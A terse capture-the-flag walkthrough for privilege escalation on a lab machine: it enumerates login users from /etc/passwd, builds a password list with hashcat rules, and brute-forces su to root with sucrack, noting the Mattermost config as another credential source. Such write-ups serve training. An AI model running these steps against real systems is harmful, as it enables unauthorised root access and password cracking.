### Foothold
CTF heavily. Try everything on a happy path to get the credential. Login in through SSH.

### Priv
```
cat /etc/passwd | grep -v 'false\|nologin'
```

##### Generate dictionary. it may take few seconds
```
hashcat --stdout pw -r /usr/share/hashcat/rules/best64.rule > pwlist
```

##### Check ssh login
```
less /etc/ssh/ssh_config
```
So no ssh brute force

##### Brute force su with sucrack
```
./sucrack -a -w 20 -s 10 -u root -rl AFLafld pwlist # Default sample would work
```

##### Alternatively mattermost config
`/opt/mattermost/config`